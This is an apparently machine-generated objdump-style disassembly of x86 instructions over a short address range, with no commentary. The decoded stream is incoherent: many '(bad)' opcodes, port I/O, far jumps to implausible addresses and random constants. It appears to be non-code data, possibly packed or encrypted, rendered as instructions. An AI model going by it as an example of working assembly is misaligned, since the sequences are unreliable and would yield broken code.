  40710e:	in     eax,dx
  40710f:	fcomp  st(1)
  407111:	or     edi,DWORD PTR ds:0x62eac46c
  407117:	repnz or edi,DWORD PTR [ecx-0x332b71b4]
  40711e:	sub    ch,BYTE PTR [esi]
  407120:	je     0x40710d
  407122:	jmp    0xcfc28cf5
  407127:	jg     0x407193
  407129:	inc    ebp
  40712a:	dec    esp
  40712b:	retf   
  40712c:	mov    ch,0x10
  40712e:	mov    ds:0xab44487b,al
  407133:	sub    bl,dh
  407135:	or     al,0x7d
  407137:	mov    ds:0xb8d34f6f,eax
  40713c:	push   cs
  40713d:	push   edi
  40713e:	jmp    0x4071b1
  407140:	sbb    eax,0x942bc123
  407145:	fidivr DWORD PTR [ecx-0x68876c17]
  40714b:	jle    0x4070f5
  40714d:	push   ds
  40714e:	clc    
  40714f:	cdq    
  407150:	loop   0x407140
  407152:	das    
  407153:	cwde   
  407154:	add    eax,0x88ad9fc7
  407159:	sbb    DWORD PTR [esi],ecx
  40715b:	push   ebx
  40715c:	lods   al,BYTE PTR ds:[esi]
  40715d:	add    ch,BYTE PTR [esi-0x7b]
  407160:	out    0x3a,al
  407162:	test   BYTE PTR [ecx+0x4a],dl
  407165:	loop   0x40719d
  407167:	inc    esp
  407168:	in     al,dx
  407169:	call   0x32542ab9
  40716e:	adc    dl,BYTE PTR [ebp-0x6566ca68]
  407174:	clc    
  407175:	or     ecx,DWORD PTR [ebx+eax*2]
  407178:	inc    ebp
  407179:	dec    ecx
  40717a:	dec    ebp
  40717b:	repz gs sahf 
  40717e:	ret    
  40717f:	ins    DWORD PTR es:[edi],dx
  407180:	inc    ecx
  407181:	xchg   edx,eax
  407182:	xor    DWORD PTR [edi],edi
  407184:	mov    edi,0xa098cf39
  407189:	rcl    DWORD PTR [edi],0x53
  40718c:	aaa    
  40718d:	ret    
  40718e:	adc    al,0xa4
  407190:	fcom   DWORD PTR [ebx+0x6326419a]
  407196:	inc    ecx
  407197:	jle    0x95399257
  40719d:	dec    ebp
  40719e:	cld    
  40719f:	jne    0x4071dc
  4071a1:	or     esi,0xc3b9c69f
  4071a7:	gs add ah,al
  4071aa:	or     ch,BYTE PTR [edx+0x1c]
  4071ad:	int3   
  4071ae:	mov    al,0x32
  4071b0:	pop    ss
  4071b1:	xor    esp,DWORD PTR [eax-0x47]
  4071b4:	int3   
  4071b5:	popf   
  4071b6:	and    bl,BYTE PTR [ebx-0x7f]
  4071b9:	fwait
  4071ba:	mov    ebp,0x301c85cf
  4071bf:	add    BYTE PTR [eax-0x158f7f4e],dl
  4071c5:	enter  0x946a,0x74
  4071c9:	(bad)  
  4071ca:	cmp    esi,DWORD PTR [eax]
  4071cc:	fucomp st(6)
  4071ce:	daa    
  4071cf:	shr    dl,0x6
  4071d2:	(bad)  
  4071d4:	test   BYTE PTR [edx-0x76],0xc5
  4071d8:	or     esp,DWORD PTR [ebx]
  4071da:	mov    cl,BYTE PTR [ecx+0x2b6865c5]
  4071e0:	rcl    BYTE PTR [ecx],1
  4071e2:	mov    esp,0x4de5bb67
  4071e7:	jge    0x407210
  4071e9:	xchg   esp,eax
  4071ea:	clc    
  4071eb:	leave  
  4071ec:	cwde   
  4071ed:	aas    
  4071ee:	mov    bl,0x2e
  4071f0:	ret    
  4071f1:	fbstp  TBYTE PTR [ebp+0x5623a438]
  4071f7:	ds jl  0x407220
  4071fa:	or     bh,BYTE PTR [edi+0x62]
  4071fd:	dec    eax
  4071fe:	mov    BYTE PTR [eax],0x34
  407201:	outs   dx,BYTE PTR ds:[esi]
  407202:	gs adc eax,0xbc1a0840
  407208:	scas   eax,DWORD PTR es:[edi]
  407209:	or     bl,dl
  40720b:	ins    DWORD PTR es:[edi],dx
  40720c:	mov    edi,0xb3ac0432
  407211:	addr16 retf 
  407213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407214:	loopne 0x40724c
  407216:	(bad)  
  407217:	out    dx,eax
  407218:	cmp    bl,BYTE PTR [eax+edi*4+0x6e]
  40721c:	xor    ecx,DWORD PTR [ebp-0x6e]
  40721f:	jg     0x4071fc
  407221:	mov    ds:0x4574fad3,al
  407226:	sub    eax,0xd12689d
  40722b:	rol    DWORD PTR [ebp+0x2f87041b],cl
  407231:	jp     0x4072a1
  407233:	int    0x8c
  407235:	sbb    bh,bh
  407237:	fsub   QWORD PTR [ecx+eax*4-0x19]
  40723b:	sub    eax,edi
  40723d:	aad    0xbd
  40723f:	fs loope 0x4071f0
  407242:	repz (bad) 
  407245:	jne    0x407274
  407247:	cmp    esp,esi
  407249:	push   edx
  40724a:	mov    bl,0xb9
  40724c:	pop    esp
  40724d:	mov    edi,0xc5207aeb
  407252:	loop   0x4072c7
  407254:	fbld   TBYTE PTR [edx]
  407256:	xchg   DWORD PTR [ebx+ebx*4+0xfc3b03a],ecx
  40725d:	aas    
  40725e:	add    BYTE PTR [ebp-0x7018d2dc],ah
  407264:	jno    0x407231
  407266:	(bad)  [edi]
  407268:	sbb    eax,0xc2653476
  40726d:	ret    
  40726e:	shl    BYTE PTR [eax+0x35d3fc5],0xee
  407275:	cmp    bh,BYTE PTR ds:0xe24ad20a
  40727b:	fwait
  40727c:	mov    ds:0x37037850,al
  407281:	dec    ebx
  407282:	fcomp  st(3)
  407284:	mov    ch,BYTE PTR [ecx]
  407286:	and    esi,0xc3b7ce5c
  40728c:	icebp  
  40728d:	retf   
  40728e:	in     eax,dx
  40728f:	fs cwde 
  407291:	mov    ch,0x7e
  407293:	out    0x11,al
  407295:	stos   DWORD PTR es:[edi],eax
  407296:	(bad)  
  407297:	js     0x40721a
  407299:	out    dx,al
  40729a:	jge    0x40727a
  40729c:	inc    esi
  40729d:	push   edx
  40729e:	rcr    DWORD PTR [eax-0x4e],1
  4072a1:	and    esp,DWORD PTR [edi-0x35]
  4072a4:	mov    bh,0xc1
  4072a6:	jl     0x407287
  4072a8:	mov    al,0x57
  4072aa:	stos   BYTE PTR es:[edi],al
  4072ab:	xchg   esi,eax
  4072ac:	das    
  4072ad:	clc    
  4072ae:	mov    ds:0x4659b2bf,eax
  4072b3:	int    0x75
  4072b5:	sub    esi,DWORD PTR [ecx+edx*1-0x2d3ae7ae]
  4072bc:	inc    ebx
  4072bd:	imul   esi,DWORD PTR [esi],0xfffffffd
  4072c0:	inc    ebx
  4072c1:	scas   eax,DWORD PTR es:[edi]
  4072c2:	push   ebp
  4072c3:	bound  ecx,QWORD PTR [ebp+0x65]
  4072c6:	jle    0x4072e5
  4072c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c9:	or     bh,BYTE PTR [ecx]
  4072cb:	mov    dl,dh
  4072cd:	xchg   ebp,eax
  4072ce:	mov    ah,0x7d
  4072d0:	jl     0x4072f6
  4072d2:	pop    ds
  4072d3:	adc    dh,BYTE PTR [ebx-0x13100a6b]
  4072d9:	cmp    ch,BYTE PTR [eax+0x35]
  4072dc:	xor    esi,ecx
  4072de:	fcomp  QWORD PTR [edx+0x6f]
  4072e1:	das    
  4072e2:	in     eax,dx
  4072e3:	jae    0x407309
  4072e5:	inc    ebx
  4072e6:	pop    esi
  4072e7:	ins    DWORD PTR es:[edi],dx
  4072e8:	pop    edi
  4072e9:	pop    ss
  4072ea:	or     bh,BYTE PTR [edx+0x40708cbf]
  4072f0:	jbe    0x4072db
  4072f2:	jne    0x4072a3
  4072f4:	stos   DWORD PTR es:[edi],eax
  4072f5:	push   esi
  4072f6:	repnz stos BYTE PTR es:[edi],al
  4072f8:	sbb    esi,ebx
  4072fa:	inc    ebp
  4072fb:	call   0x6c88a479
  407300:	mov    cl,0x95
  407302:	jmp    ecx
  407304:	sub    DWORD PTR [edx+0x40],ebp
  407307:	and    edi,DWORD PTR [ecx-0x25e7c79]
  40730d:	jb     0x4072b4
  40730f:	jne    0x4072ad
  407311:	lods   eax,DWORD PTR ds:[esi]
  407312:	push   ebp
  407313:	xor    dl,BYTE PTR [ebp+0x31]
  407316:	or     ah,bh
  407318:	jmp    0x407377
  40731a:	cmp    ecx,ecx
  40731c:	retf   
  40731d:	jno    0x407380
  40731f:	cmp    BYTE PTR [ebp+0x7a4dbba8],dl
  407325:	push   0xffffff8c
  407327:	outs   dx,BYTE PTR ds:[esi]
  407328:	and    DWORD PTR [eax],ecx
  40732a:	mov    esp,0x80cb582b
  40732f:	mov    ah,0x0
  407331:	pop    ebx
  407332:	jmp    0x407314
  407334:	jmp    0xfe0085c2
  407339:	inc    esi
  40733a:	jnp    0x407395
  40733c:	mov    edi,0xdab7d354
  407341:	xor    eax,0x42a5b98c
  407346:	xchg   esi,ebp
  407348:	shl    BYTE PTR [ebx-0x4d8c81cb],cl
  40734e:	mov    DWORD PTR [eax],ebx
  407350:	mov    bl,dh
  407352:	mov    edx,0x353cc5ef
  407357:	or     esp,DWORD PTR [ebp+0x595aede5]
  40735d:	or     bl,bh
  40735f:	sub    al,0x9f
  407361:	jl     0x407347
  407363:	mov    bh,ch
  407365:	lods   al,BYTE PTR ds:[esi]
  407366:	dec    esi
  407367:	pop    eax
  407368:	ss repz ss cmp al,0x36
  40736d:	cwde   
  40736e:	jl     0x407301
  407370:	jge    0x4073b6
  407372:	mov    BYTE PTR [eax+0x3e],bl
  407375:	cmp    al,0x72
  407377:	lds    ebp,FWORD PTR [ecx+ebx*8-0x6eb63432]
  40737e:	dec    ecx
  40737f:	adc    DWORD PTR [edx+0x6ac76c2a],edx
  407385:	mov    gs,WORD PTR [edx-0x75]
  407388:	mov    ds:0x4b0d162f,eax
  40738d:	jg     0x4073e0
  40738f:	sbb    al,0x70
  407391:	popf   
  407392:	pusha  
  407393:	div    BYTE PTR [eax+0x60]
  407396:	mov    ch,0x3d
  407398:	xchg   DWORD PTR [eax],edx
  40739a:	fcomp  st(6)
  40739c:	std    
  40739d:	ret    0xd344
  4073a0:	mov    ecx,0xbc5334b6
  4073a5:	in     al,0x9e
  4073a7:	mov    esp,0x13041bc6
  4073ac:	cli    
  4073ad:	push   cs
  4073ae:	or     eax,0xdd990cb4
  4073b3:	inc    ecx
  4073b4:	clc    
  4073b5:	rcl    BYTE PTR [edi],cl
  4073b7:	les    eax,FWORD PTR ds:0x893770e1
  4073bd:	inc    ecx
  4073be:	jbe    0x4073e2
  4073c0:	mov    ebx,0xe562857b
  4073c5:	sbb    al,0xf5
  4073c7:	dec    edi
  4073c8:	sbb    BYTE PTR [edi],bl
  4073ca:	stos   DWORD PTR es:[edi],eax
  4073cb:	neg    BYTE PTR [esi+eax*4+0x3b]
  4073cf:	shl    bl,1
  4073d1:	and    BYTE PTR [edx+0x6c],bl
  4073d4:	ret    0x94fe
  4073d7:	cli    
  4073d8:	add    DWORD PTR [eax+0x7b],edx
  4073db:	cmp    DWORD PTR [edx+0x30bdf680],ecx
  4073e1:	cmp    esp,0xffffff95
  4073e4:	adc    eax,0xbaa97fd5
  4073e9:	add    DWORD PTR gs:[esp+esi*1-0x25161cdf],0xb239d70f
  4073f5:	aad    0xb5
  4073f7:	fdivr  st,st(0)
  4073f9:	xchg   esp,eax
  4073fa:	fstp   DWORD PTR [edx-0x7]
  4073fd:	sub    DWORD PTR [esi],ebp
  4073ff:	sti    
  407400:	(bad)  
  407401:	sbb    eax,0xc9a4c681
  407406:	mov    bh,0x9e
  407408:	xchg   esi,eax
  407409:	(bad)  
  40740a:	out    0xcb,al
  40740c:	push   0x57
  40740e:	pop    ecx
  40740f:	mov    edi,0x1fd26dd1
  407414:	cmp    cl,dh
  407416:	push   ebp
  407417:	sbb    dh,dh
  407419:	fisttp QWORD PTR [edx]
  40741b:	fstp   st(1)
  40741d:	cmp    ecx,DWORD PTR [ecx+0x52]
  407420:	and    dl,ah
  407422:	sub    eax,0x58b57ef0
  407427:	ins    BYTE PTR es:[edi],dx
  407428:	sub    eax,0x67394d60
  40742d:	jns    0x4073f4
  40742f:	sbb    BYTE PTR [eax],ah
  407431:	out    dx,al
  407432:	aaa    
  407433:	and    dh,BYTE PTR [esi]
  407435:	xchg   BYTE PTR [eax-0x15],bh
  407438:	out    0x20,eax
  40743a:	shl    BYTE PTR [ecx+eax*8-0x4],0x6c
  40743f:	mov    al,ds:0x4d957d55
  407444:	test   BYTE PTR [ebp-0x2ec138f1],0x9b
  40744b:	sbb    cl,ch
  40744d:	xchg   BYTE PTR [eax+0x49],al
  407450:	dec    edi
  407451:	dec    eax
  407452:	push   0xac2e83e2
  407457:	test   al,0x66
  407459:	pop    esi
  40745a:	cmp    BYTE PTR [ebx+0x6f],cl
  40745d:	iret   
  40745e:	push   0x4e2037ac
  407463:	xchg   ebp,eax
  407464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407465:	mov    eax,ds:0x39601ff6
  40746a:	xchg   ebx,eax
  40746b:	jae    0x407400
  40746d:	retf   0x940d
  407470:	push   ds
  407471:	(bad)  
  407473:	(bad)  
  407474:	ds js  0x4074c3
  407477:	scas   al,BYTE PTR es:[edi]
  407478:	xchg   edx,eax
  407479:	jmp    0x407402
  40747b:	mov    dl,0xdc
  40747d:	mov    eax,ds:0xa58b637
  407482:	push   esp
  407483:	mov    BYTE PTR [eax+0x4d],dh
  407486:	sub    bl,BYTE PTR [esi-0xe]
  407489:	push   ss
  40748a:	or     al,0x5e
  40748c:	test   BYTE PTR [ebx],0xc5
  40748f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407490:	out    dx,al
  407491:	add    al,0xde
  407493:	lahf   
  407494:	je     0x4074b8
  407496:	aaa    
  407497:	dec    esp
  407498:	or     eax,0xbe3682f2
  40749d:	sbb    DWORD PTR [edi+0x11388798],ecx
  4074a3:	sub    al,0x6d
  4074a5:	cmp    DWORD PTR [ebx-0x685e8b9f],esi
  4074ab:	sbb    BYTE PTR ds:0xbe381ae,ah
  4074b1:	add    eax,0x97ad2ad
  4074b6:	in     al,0xd7
  4074b8:	mov    eax,ds:0x929a18d4
  4074bd:	icebp  
  4074be:	scas   eax,DWORD PTR es:[edi]
  4074bf:	inc    ebp
  4074c0:	call   0xb9bd7ff1
  4074c5:	aad    0x78
  4074c7:	mov    ebp,0x2bfe12a4
  4074cc:	scas   eax,DWORD PTR es:[edi]
  4074cd:	xor    al,0x47
  4074cf:	inc    esp
  4074d0:	ins    BYTE PTR es:[edi],dx
  4074d1:	pop    ecx
  4074d2:	imul   eax,ebp,0xffffff90
  4074d5:	jo     0x407507
  4074d7:	psadbw mm0,QWORD PTR [edx-0x40]
  4074db:	bound  esp,QWORD PTR [ebx]
  4074dd:	add    al,0x6a
  4074df:	adc    eax,0xe3e42e0c
  4074e4:	sbb    BYTE PTR [esi],ah
  4074e6:	sub    esi,DWORD PTR [ebx-0x4c]
  4074e9:	mov    dh,0x3c
  4074eb:	sub    eax,esp
  4074ed:	xchg   ecx,eax
  4074ee:	stos   BYTE PTR es:[edi],al
  4074ef:	jnp    0x407548
  4074f1:	jbe    0x4074cf
  4074f3:	jmp    0xe21c:0xf33a44d0
  4074fa:	test   bh,bl
  4074fc:	cld    
  4074fd:	pusha  
  4074fe:	xchg   edx,eax
  4074ff:	mov    bl,0xb
  407501:	call   0xeaf6:0x3af6eafe
  407508:	pop    esp
  407509:	hlt    
  40750a:	out    0x4b,eax
  40750c:	sbb    eax,0xe8de7575
  407511:	cmp    al,BYTE PTR [edi-0x5f]
  407514:	loopne 0x40749a
  407516:	out    0xe3,eax
  407518:	jg     0x40755e
  40751a:	xor    esi,DWORD PTR [esi]
  40751c:	dec    esp
  40751d:	dec    ecx
  40751e:	cmc    
  40751f:	add    DWORD PTR [ebx+0x3c],ecx
  407522:	push   edx
  407523:	push   esp
  407524:	jg     0x4075a2
  407526:	aad    0xb1
  407528:	dec    edx
  407529:	mov    ds:0x88c2155b,eax
  40752e:	cmp    DWORD PTR [edi+0x3],edx
  407531:	cwde   
  407532:	outs   dx,BYTE PTR ds:[esi]
  407533:	pop    edx
  407534:	sbb    BYTE PTR [ebp-0x1c78aeec],cl
  40753a:	sub    eax,0x3d965619
  40753f:	jno    0x4075bb
  407541:	jmp    0x40755f
  407543:	repnz mov ebx,?
  407546:	and    BYTE PTR ds:0xe1cf23d2,ah
  40754c:	fiadd  DWORD PTR [edx+0x5291d71]
  407552:	clc    
  407553:	xchg   edx,eax
  407554:	cli    
  407555:	lea    esi,[edx]
  407557:	call   0x9e3a7f77
  40755c:	mov    esi,0x5832e97b
  407561:	shr    DWORD PTR [edi+0x40],0x14
  407565:	xchg   DWORD PTR [eax-0x332c9964],ebx
  40756b:	sbb    al,0x6f
  40756d:	sub    eax,DWORD PTR [eax-0x2c]
  407570:	and    ebx,DWORD PTR [ebx+0x26b04082]
  407576:	les    esi,FWORD PTR [eax-0x22]
  407579:	push   0x1e
  40757b:	dec    edx
  40757c:	xor    eax,0xfc5bb37
  407581:	pop    eax
  407582:	pop    edi
  407583:	repnz and eax,0x9b43e3d6
  407589:	mov    cl,0xb8
  40758b:	mov    dl,0x45
  40758d:	loope  0x407602
  40758f:	or     al,0x95
  407591:	mov    al,BYTE PTR [ebp-0x7d]
  407594:	outs   dx,BYTE PTR ds:[esi]
  407595:	into   
  407596:	push   esp
  407597:	xchg   edi,eax
  407598:	jle    0x407590
  40759a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40759c:	jns    0x4075d7
  40759e:	jl     0x407602
  4075a0:	pop    esp
  4075a1:	xchg   BYTE PTR [esp+ecx*8-0x5b],bh
  4075a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075a6:	sub    ebp,ebx
  4075a8:	push   0x95d7fda5
  4075ad:	fucomp st(5)
  4075af:	jmp    0x407600
  4075b1:	push   esi
  4075b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075b3:	add    ebp,DWORD PTR [ecx+0x4ec874ad]
  4075b9:	pusha  
  4075ba:	pop    ss
  4075bb:	jae    0x40761c
  4075bd:	aas    
  4075be:	jmp    0x40755d
  4075c0:	ror    esi,cl
  4075c2:	outs   dx,DWORD PTR ds:[esi]
  4075c3:	pop    eax
  4075c4:	jno    0x40757e
  4075c6:	xchg   ecx,eax
  4075c7:	scas   eax,DWORD PTR es:[edi]
  4075c8:	mov    edi,0x42aae3e
  4075cd:	and    bl,BYTE PTR [ecx-0x286fda91]
  4075d3:	jo     0x407605
  4075d5:	inc    ecx
  4075d6:	into   
  4075d7:	push   0xffffffb8
  4075d9:	je     0x407566
  4075db:	cmp    ah,0xef
  4075de:	lea    esp,[esi+0x69]
  4075e1:	test   al,0x7e
  4075e3:	jl     0x4075a8
  4075e5:	daa    
  4075e6:	outs   dx,DWORD PTR ds:[esi]
  4075e7:	cmp    esi,ebx
  4075e9:	stos   DWORD PTR es:[edi],eax
  4075ea:	pop    ebp
  4075eb:	(bad)  
  4075ec:	jle    0x407662
  4075ee:	sub    al,0x9b
  4075f0:	lea    eax,[ecx+0x6f]
  4075f3:	inc    esp
  4075f4:	fidiv  DWORD PTR [esi]
  4075f6:	ror    BYTE PTR [esi+eax*2+0x6d19e14c],cl
  4075fd:	and    BYTE PTR [edx+0x683378a3],0x4f
  407604:	push   ecx
  407605:	mov    ebx,0xe88c7e81
  40760a:	imul   esp,DWORD PTR [edx+ebx*4-0x21bf8d56],0x63
  407612:	xchg   edi,eax
  407613:	and    eax,0x91901ef2
  407618:	adc    al,0x55
  40761a:	aad    0x6f
  40761c:	ret    
  40761d:	into   
  40761e:	pop    edx
  40761f:	mov    esi,ebp
  407621:	arpl   WORD PTR [edx+esi*8-0x4a],si
  407625:	or     DWORD PTR [ecx+0x2a],edi
  407628:	sub    eax,0x39d62620
  40762d:	cwde   
  40762e:	cs idiv ebp
  407631:	jnp    0x407625
  407633:	aas    
  407634:	out    dx,eax
  407635:	fstenv [ebx+ebp*1]
  407639:	cmc    
  40763a:	push   esi
  40763b:	test   eax,0xb1b6a407
  407640:	cmp    eax,0x25d0061d
  407645:	push   eax
  407646:	inc    edx
  407647:	fwait
  407648:	cwde   
  407649:	mov    bh,0x4
  40764b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764c:	pop    ss
  40764d:	jmp    0x4076c9
  40764f:	scas   eax,DWORD PTR es:[edi]
  407650:	mov    ebx,fs
  407652:	dec    ebp
  407653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407654:	jb     0x407651
  407656:	(bad)  
  407657:	mov    ch,BYTE PTR [ecx-0x4a]
  40765a:	repz push ecx
  40765c:	sub    al,0xdd
  40765e:	push   ds
  40765f:	sub    cl,BYTE PTR [ebx]
  407661:	les    ecx,FWORD PTR [eax]
  407663:	cmp    eax,0xe2a010c
  407668:	add    BYTE PTR [ebx-0x41],0xb3
  40766c:	dec    ecx
  40766d:	jmp    0x5bb19ec5
  407672:	mov    edx,0xfe31b932
  407677:	cmc    
  407678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407679:	pop    DWORD PTR [edi]
  40767b:	pop    eax
  40767c:	sub    DWORD PTR [edi-0x5811a9d3],edi
  407682:	push   es
  407683:	fs dec ebx
  407685:	and    bl,BYTE PTR [ebx+0x33db0a7f]
  40768b:	jb     0x407684
  40768d:	sbb    dl,BYTE PTR [ebx]
  40768f:	lahf   
  407690:	daa    
  407691:	cli    
  407692:	push   edx
  407693:	cli    
  407694:	push   ebx
  407695:	xor    eax,0x53637b86
  40769a:	xchg   edx,eax
  40769b:	out    0x54,eax
  40769d:	ss sub al,0xc1
  4076a0:	push   ds
  4076a1:	and    al,0x31
  4076a3:	cmp    DWORD PTR [edi-0x7fe30b27],esp
  4076a9:	mov    BYTE PTR [edi-0x641cb030],al
  4076af:	add    esp,DWORD PTR [ebx+0x36]
  4076b2:	push   0xd47da4bf
  4076b7:	sub    esp,DWORD PTR [edi+0x79]
  4076ba:	mov    edx,0x7dbb4d0d
  4076bf:	mov    dl,0x89
  4076c1:	push   edi
  4076c2:	sahf   
  4076c3:	ror    DWORD PTR [ecx-0x1763ea07],cl
  4076c9:	ds aaa 
  4076cb:	xor    bh,dl
  4076cd:	or     al,0x0
  4076cf:	and    dh,BYTE PTR ds:0xae470ff0
  4076d5:	xchg   ecx,eax
  4076d6:	adc    al,bl
  4076d8:	fstp   st(7)
  4076da:	(bad)  
  4076db:	fist   DWORD PTR [ebp-0x7e35a4dd]
  4076e1:	inc    esp
  4076e2:	sbb    al,0x85
  4076e4:	dec    ecx
  4076e5:	inc    ebx
  4076e6:	push   edi
  4076e7:	xchg   BYTE PTR [esi],dl
  4076e9:	sub    BYTE PTR [edi+ebx*8+0x2f731bf],ch
  4076f0:	jg     0x407757
  4076f2:	aaa    
  4076f3:	retf   
  4076f4:	loopne 0x4076f6
  4076f6:	mov    WORD PTR [edi+esi*1],cs
  4076f9:	test   eax,0xd110b0b3
  4076fe:	and    esp,esp
  407700:	fistp  QWORD PTR [bp+si-0x1]
  407704:	std    
  407705:	test   eax,0x7e14e690
  40770a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40770b:	inc    DWORD PTR [ebp-0x71]
  40770e:	jp     0x407761
  407710:	aad    0x95
  407712:	jb     0x4076ff
  407714:	test   eax,ebp
  407716:	inc    eax
  407717:	jb     0x407723
  407719:	mov    cl,0x1
  40771b:	inc    esi
  40771c:	test   al,0xf7
  40771e:	xchg   ebp,eax
  40771f:	lods   eax,DWORD PTR ds:[esi]
  407720:	repnz mov WORD PTR [edx],es
  407723:	rol    bh,cl
  407725:	mov    eax,ds:0x7ca5bb49
  40772a:	pop    es
  40772b:	xor    eax,0xedbb47c4
  407730:	add    BYTE PTR [ebx-0x5b51cdfe],bh
  407736:	je     0x4076d5
  407738:	lea    ebx,[ebx]
  40773a:	mov    ebx,edi
  40773c:	inc    ecx
  40773d:	repnz shl dl,0xb0
  407741:	and    DWORD PTR [ebp-0x13ea1c69],eax
  407747:	jnp    0x4077b8
  407749:	cwde   
  40774a:	inc    ebx
  40774b:	jnp    0x407769
  40774d:	imul   edi,DWORD PTR [ecx+eax*8+0x2a],0x30
  407752:	mov    cl,0x7c
  407754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407755:	(bad)  
  407756:	jbe    0x4077cd
  407758:	mov    ch,0x48
  40775a:	sahf   
  40775b:	mov    bl,0x3d
  40775d:	jmp    0x882a:0xed56175b
  407764:	scas   al,BYTE PTR es:[edi]
  407765:	pushf  
  407766:	jge    0x40777b
  407768:	(bad)  
  407769:	mov    eax,ds:0xa99eafc5
  40776e:	test   DWORD PTR [esi+ebp*2],esp
  407771:	(bad)  
  407772:	in     al,0xb1
  407774:	js     0x40775c
  407776:	push   ss
  407777:	inc    eax
  407778:	xor    ebx,DWORD PTR ds:0x86fef7c6
  40777e:	ja     0x4077f2
  407780:	ins    DWORD PTR es:[edi],dx
  407781:	pop    ds
  407782:	xor    cl,BYTE PTR [esi-0x7fc865b4]
  407788:	sbb    ah,BYTE PTR [ebp+0x98d57ef]
  40778e:	sbb    BYTE PTR [ecx],dh
  407790:	ficom  WORD PTR [edx-0x2067803d]
  407796:	add    edi,eax
  407798:	cdq    
  407799:	sub    BYTE PTR [edx],0x7d
  40779c:	pop    ss
  40779d:	mov    ds:0xe35f4340,al
  4077a2:	in     al,dx
  4077a3:	fsub   DWORD PTR [edx-0x25c0458a]
  4077a9:	retf   
  4077aa:	push   edi
  4077ab:	xor    DWORD PTR [ecx+ecx*2+0x385f6b04],ecx
  4077b2:	or     ebp,DWORD PTR [esi]
  4077b4:	add    DWORD PTR [esi+0x2f],ecx
  4077b7:	into   
  4077b8:	push   edx
  4077b9:	mov    eax,eax
  4077bb:	dec    ecx
  4077bc:	inc    eax
  4077bd:	inc    ecx
  4077be:	sbb    eax,0xbbc2e5b6
  4077c3:	jb     0x40777b
  4077c5:	popa   
  4077c6:	add    DWORD PTR [ebp-0x80],ecx
  4077c9:	sar    DWORD PTR [esi+0x63],1
  4077cc:	gs imul eax,ebp,0x3e6f95cf
  4077d3:	cmp    BYTE PTR [eax+0x39],bh
  4077d6:	xchg   ebp,eax
  4077d7:	adc    DWORD PTR cs:[ebp-0x525a742a],edx
  4077de:	fcmovnb st,st(5)
  4077e0:	inc    edi
  4077e1:	imul   ebp,edi,0x1fa7491b
  4077e7:	adc    BYTE PTR [edi-0x1f49cded],bh
  4077ed:	aam    0x9c
  4077ef:	pop    edi
  4077f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077f1:	sbb    BYTE PTR [ebx-0xc14a8e5],dl
  4077f7:	mov    eax,ds:0xd18c0b67
  4077fc:	mov    esp,DWORD PTR [edx-0x61]
  4077ff:	das    
  407800:	loope  0x4077ac
  407802:	xor    esi,DWORD PTR [ebx]
  407804:	mov    edx,0xfa085db8
  407809:	icebp  
  40780a:	cmp    eax,0x8cc84c0a
  40780f:	sub    esi,edi
  407811:	sbb    dl,0x9c
  407814:	adc    DWORD PTR [eax+ebp*4-0x251922cc],eax
  40781b:	inc    ecx
  40781c:	push   cs
  40781d:	(bad)  
  40781f:	mov    edx,DWORD PTR [edi+0x52]
  407822:	add    bl,BYTE PTR [ebp+0x3c3640b0]
  407828:	ss inc ecx
  40782a:	jmp    0xd8c:0xf24c7c6b
  407831:	outs   dx,BYTE PTR ds:[esi]
  407832:	cmp    BYTE PTR [edx-0xf432350],ch
  407838:	xor    ebx,DWORD PTR [edi-0x32]
  40783b:	retf   
  40783c:	mov    bl,0x7e
  40783e:	and    eax,edi
  407840:	loope  0x407814
  407842:	dec    esp
  407843:	or     eax,0xa7d72529
  407848:	fcomp  DWORD PTR [esp+ebp*1-0x74]
  40784c:	in     eax,0x72
  40784e:	in     eax,dx
  40784f:	pop    esp
  407850:	mov    esi,0x6f5c8b3b
  407856:	cvtps2pd xmm4,QWORD PTR [esi]
  407859:	pop    ds
  40785a:	mov    ebp,0x28838b3d
  40785f:	xor    DWORD PTR [ebp-0x35],ecx
  407862:	mov    dl,0x69
  407864:	enter  0xbe2f,0xec
  407868:	inc    eax
  407869:	cmp    ebp,edi
  40786b:	iret   
  40786c:	adc    ebp,edi
  40786e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40786f:	mov    al,0xe6
  407871:	inc    esi
  407872:	xchg   ebp,eax
  407873:	lahf   
  407874:	mov    ecx,0x45e8d8b5
  407879:	shr    bh,cl
  40787b:	mov    ch,0xd0
  40787d:	jno    0x4078a8
  40787f:	aad    0xb7
  407881:	aas    
  407882:	repnz sbb esi,eax
  407885:	cwde   
  407886:	push   ss
  407887:	cmp    edi,edx
  407889:	or     edi,eax
  40788b:	mov    ds:0x3255b4e,al
  407890:	dec    eax
  407891:	mov    ch,0xde
  407893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407894:	push   esi
  407895:	pop    esi
  407896:	xchg   esp,eax
  407897:	add    ebx,eax
  407899:	jnp    0x4078dc
  40789b:	cmc    
  40789c:	ins    BYTE PTR es:[edi],dx
  40789d:	push   edx
  40789e:	jle    0x4078ee
  4078a0:	dec    ecx
  4078a1:	int3   
  4078a2:	push   edi
  4078a3:	jmp    0x386c4640
  4078a8:	push   cs
  4078a9:	les    edi,FWORD PTR [ebx-0x76]
  4078ac:	cs in  eax,0x57
  4078af:	xor    cl,BYTE PTR [edx-0x3b]
  4078b2:	mov    ebp,0x6f9eb686
  4078b7:	inc    esp
  4078b8:	(bad)  
  4078b9:	pop    ss
  4078ba:	pop    ebx
  4078bb:	imul   ecx,DWORD PTR [edi+0x3a],0xb6f31742
  4078c2:	mov    dl,0x89
  4078c4:	mov    eax,ds:0x829c79f
  4078c9:	xlat   BYTE PTR ds:[ebx]
  4078ca:	mov    eax,0x4edb2bfc
  4078cf:	setae  dl
